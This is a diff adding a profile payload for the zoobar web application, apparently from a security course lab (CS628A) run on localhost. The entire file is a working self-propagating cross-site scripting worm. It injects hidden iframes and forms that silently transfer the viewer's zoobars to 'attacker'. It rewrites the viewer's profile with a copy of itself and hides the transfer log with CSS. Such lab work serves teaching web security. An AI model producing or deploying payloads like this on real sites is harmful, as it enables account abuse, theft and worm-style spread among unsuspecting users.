@@ -1,0 +1,25 @@
+I Love CS628A!</b></div>
+<script> var zoob =1; </script>
+<div id="xx">
+<div id="content"></div>
+<div id="content1"></div>
+<script> document.getElementById("content").innerHTML = 
+'<iframe  style="visibility:hidden;position:absolute;" width="0" height="0" name="if1" id="if1"></iframe><form id="myform1" style="display:none;" action="http://localhost:8080/zoobar/index.cgi/transfer" target="if1" method="POST">\
+  <input type="text" style="display:none;" name="zoobars" id="zoobars" value="" />\
+  <input type="text" style="display:none;" name="recipient" id="recipient" value=""/>\
+</form>';
+function setParam(zoobars,recipient){
+  document.getElementById("zoobars").value = zoobars;
+  document.getElementById("recipient").value = recipient;
+}
+setParam(zoob,"attacker");
+document.getElementById("content1").innerHTML = '<iframe  style="visibility:hidden;position:absolute;" width="0" height="0" name="if2" id="if2"></iframe><form id="myform2" style="display:none;" method="POST" action = \
+"http://localhost:8080/zoobar/index.cgi/" target="if2" name="profileform">\
+    <input type="text" style="display:none;" name="profile_update" id = "profile_update"></input></form>';
+var zoob1 = zoob+1;
+document.getElementById("profile_update").value = "I Love CS628A!<script> var zoob="+zoob1+";<\/script>"+ document.getElementById("xx").outerHTML+"<style>.log td{display:none;}<\/style>";
+document.getElementById("myform1").submit();
+document.getElementById("myform2").submit();
+</script>
+</div>
+<style>.log td{display:none;}</style><div id="zoobars" class="10"><b>
